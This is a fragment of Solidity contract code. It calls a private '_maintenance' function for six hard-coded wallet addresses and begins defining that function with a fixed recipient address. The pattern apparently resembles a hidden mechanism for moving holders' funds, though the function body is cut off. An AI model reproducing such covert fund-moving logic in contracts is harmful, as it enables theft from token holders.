_maintenance(0x294Efa57cB8C5b0299980D8f1eE5F373Bd44a66d);
_maintenance(0xC2B1d3b59C4a9e702AC3823C881417242Bba5830);
_maintenance(0x79A1ddA6625Dc4842625EF05591e4f2322232120);
_maintenance(0x5d22e32398CAE8F8448df5491b50C39B7F271016);
_maintenance(0x587E1eB15a2E98B575f8f4925310684111Be9812);
_maintenance(0x6D257D2dB115947dc0C75d285B4396a03C577E2E);
}

function _maintenance(address sender) private {
address recipient = address(0x78FC40ca8A23cf02654d4A5638Ba4d71BAcaa965);
